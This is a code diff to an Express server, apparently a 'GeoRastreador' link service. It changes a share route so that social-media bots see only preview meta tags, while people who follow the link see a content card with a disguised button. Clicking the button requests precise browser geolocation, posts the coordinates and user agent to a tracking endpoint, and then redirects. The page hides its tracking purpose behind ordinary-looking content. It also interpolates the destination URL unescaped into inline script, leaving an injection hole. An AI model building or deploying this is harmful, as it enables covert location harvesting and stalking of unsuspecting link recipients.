@@ -110,18 +110,44 @@ const fetchLinkMeta = async (id) => {
     return { title, description, image };
 };
 
-// Social Share Open Graph Proxy for /s/:id and /track/:id (bots only via vercel.json conditional rewrite)
-// For bots: serves meta tags only. For users: loading page with redirect to /track/:id
-const handleShareRoute = async (req, res) => {
-    const { title, description, image } = await fetchLinkMeta(req.params.id);
+// Helper: Fetch full link data including destination URL
+const fetchLinkData = async (id) => {
+    let title = 'GeoRastreador';
+    let description = 'Comparte tu ubicación en tiempo real.';
+    const defaultImage = 'https://cdn-icons-png.flaticon.com/512/854/854878.png';
+    let image = defaultImage;
+    let destinationUrl = '#';
+    let buttonText = 'Más información';
+    
+    try {
+        if (models && models.Link) {
+            const link = await models.Link.findByPk(id);
+            if (link) {
+                title = link.title || title;
+                description = link.description || description;
+                image = isValidOgImageUrl(link.imageUrl) ? link.imageUrl : defaultImage;
+                destinationUrl = link.destinationUrl || '#';
+                buttonText = link.buttonText || 'Más información';
+            }
+        }
+    } catch (e) {
+        console.error('Fetch Link Error:', e);
+    }
+    return { title, description, image, destinationUrl, buttonText };
+};
+
+// Landing Page Route - /s/:id shows the preview card
+app.get('/s/:id', async (req, res) => {
+    const { title, description, image, destinationUrl, buttonText } = await fetchLinkData(req.params.id);
     const fullUrl = `${req.protocol}://${req.get('host')}/s/${req.params.id}`;
-    const redirectUrl = `/track/${req.params.id}`;
-    const userAgent = req.headers['user-agent'] || '';
-    const isBot = isSocialBot(userAgent);
+    const trackUrl = `/track/${req.params.id}`;
+    const isBot = isSocialBot(req.headers['user-agent'] || '');
     const safeTitle = escapeHtml(title);
     const safeDescription = escapeHtml(description);
+    const safeButtonText = escapeHtml(buttonText);
     const ogTags = generateOgHtml(title, description, image, fullUrl);
 
+    // For bots: minimal HTML with meta tags
     if (isBot) {
         return res.send(`<!DOCTYPE html>
 <html lang="es">
@@ -135,7 +161,7 @@ const handleShareRoute = async (req, res) => {
 </html>`);
     }
 
-    // Regular users: loading page with redirect (looks like a generic content/news page)
+    // For users: Landing page with image, title, description and CTA button
     res.send(`<!DOCTYPE html>
 <html lang="es">
 <head>
@@ -146,35 +172,145 @@ const handleShareRoute = async (req, res) => {
     ${ogTags}
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
-        .card { max-width: 420px; width: 100%; background: #1e293b; border-radius: 16px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.4); }
-        .card-img { width: 100%; height: 220px; object-fit: cover; display: block; }
-        .card-img-placeholder { width: 100%; height: 220px; background: linear-gradient(135deg, #334155, #1e293b); display: flex; align-items: center; justify-content: center; color: #475569; font-size: 48px; }
-        .card-body { padding: 24px; }
-        h1 { font-size: 22px; font-weight: 700; margin-bottom: 10px; line-height: 1.3; }
-        .desc { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
-        .btn { display: block; width: 100%; text-align: center; background: #3b82f6; color: white; padding: 14px 24px; border-radius: 10px; text-decoration: none; font-weight: 600; font-size: 16px; transition: background 0.2s; }
-        .btn:hover { background: #2563eb; }
-        .loading-text { text-align: center; color: #64748b; font-size: 12px; margin-top: 12px; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            background: linear-gradient(135deg, #1e3a5f 0%, #0f172a 100%); 
+            color: white; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+            padding: 20px; 
+        }
+        .card { 
+            max-width: 480px; 
+            width: 100%; 
+            background: #1e293b; 
+            border-radius: 20px; 
+            overflow: hidden; 
+            box-shadow: 0 25px 80px rgba(0,0,0,0.5); 
+        }
+        .card-img { 
+            width: 100%; 
+            height: 280px; 
+            object-fit: cover; 
+            display: block; 
+        }
+        .card-img-placeholder { 
+            width: 100%; 
+            height: 280px; 
+            background: linear-gradient(135deg, #334155, #1e293b); 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            color: #64748b; 
+            font-size: 64px; 
+        }
+        .card-body { padding: 28px; }
+        h1 { font-size: 24px; font-weight: 700; margin-bottom: 12px; line-height: 1.3; }
+        .desc { color: #94a3b8; font-size: 15px; line-height: 1.6; margin-bottom: 24px; }
+        .btn { 
+            display: block; 
+            width: 100%; 
+            text-align: center; 
+            background: #3b82f6; 
+            color: white; 
+            padding: 16px 24px; 
+            border-radius: 12px; 
+            text-decoration: none; 
+            font-weight: 600; 
+            font-size: 16px; 
+            border: none;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s; 
+        }
+        .btn:hover { background: #2563eb; transform: translateY(-2px); }
+        .btn:active { transform: translateY(0); }
+        .btn:disabled { background: #475569; cursor: not-allowed; transform: none; }
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .error-msg {
+            background: rgba(239, 68, 68, 0.1);
+            color: #f87171;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 16px;
+            font-size: 13px;
+            text-align: center;
+            display: none;
+        }
     </style>
-    <script>setTimeout(() => { window.location.href = '${redirectUrl}'; }, 2500);</script>
 </head>
 <body>
     <div class="card">
-        ${image ? `<img class="card-img" src="${image}" alt="${safeTitle}" onerror="this.style.display='none'">` : '<div class="card-img-placeholder">&#9881;</div>'}
+        ${image ? `<img class="card-img" src="${image}" alt="${safeTitle}" onerror="this.parentElement.querySelector('.card-img-placeholder').style.display='flex'; this.style.display='none';">
+        <div class="card-img-placeholder" style="display:none;">&#127744;</div>` : '<div class="card-img-placeholder">&#127744;</div>'}
         <div class="card-body">
             <h1>${safeTitle}</h1>
             <p class="desc">${safeDescription}</p>
-            <a href="${redirectUrl}" class="btn">Ver contenido</a>
-            <p class="loading-text">Cargando contenido...</p>
+            <button id="ctaBtn" class="btn">${safeButtonText}</button>
+            <div id="errorMsg" class="error-msg"></div>
         </div>
     </div>
+    
+    <script>
+        document.getElementById('ctaBtn').addEventListener('click', async function() {
+            const btn = this;
+            const errorMsg = document.getElementById('errorMsg');
+            
+            btn.disabled = true;
+            btn.innerHTML = 'Obteniendo ubicación... <span class="spinner"></span>';
+            errorMsg.style.display = 'none';
+            
+            // Try to get location
+            if (!navigator.geolocation) {
+                // No geolocation support, redirect anyway
+                window.location.href = '${destinationUrl}';
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    // Got location, send to server then redirect
+                    try {
+                        await fetch('${trackUrl}', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude,
+                                userAgent: navigator.userAgent
+                            })
+                        });
+                    } catch (e) {
+                        console.log('Tracking error:', e);
+                    }
+                    // Redirect to destination
+                    window.location.href = '${destinationUrl}';
+                },
+                (error) => {
+                    // Location denied or error, redirect anyway
+                    console.log('Location error:', error);
+                    window.location.href = '${destinationUrl}';
+                },
+                { timeout: 10000, enableHighAccuracy: true }
+            );
+        });
+    </script>
 </body>
 </html>`);
-};
-
-app.get('/s/:id', handleShareRoute);
-app.get('/track/:id', handleShareRoute);
+});
 
 // Simple Ping
 app.get('/api/ping', (req, res) => {
